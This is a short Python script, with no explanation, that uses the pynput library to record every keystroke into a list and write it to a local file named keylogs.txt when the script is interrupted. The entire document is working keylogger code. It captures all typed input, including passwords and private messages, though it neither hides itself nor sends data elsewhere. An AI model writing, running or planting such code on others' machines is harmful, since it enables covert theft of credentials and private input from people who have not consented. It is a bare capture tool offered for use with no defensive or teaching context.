from pynput import keyboard
import os

key_strokes = []

def on_press(key):
    key_strokes.append(key)

listener = keyboard.Listener(on_press=on_press)
listener.start()

try:
    while True:
        pass
except KeyboardInterrupt:
    pass

listener.stop()

with open("keylogs.txt", "w") as f:
    for key in key_strokes:
        f.write(str(key))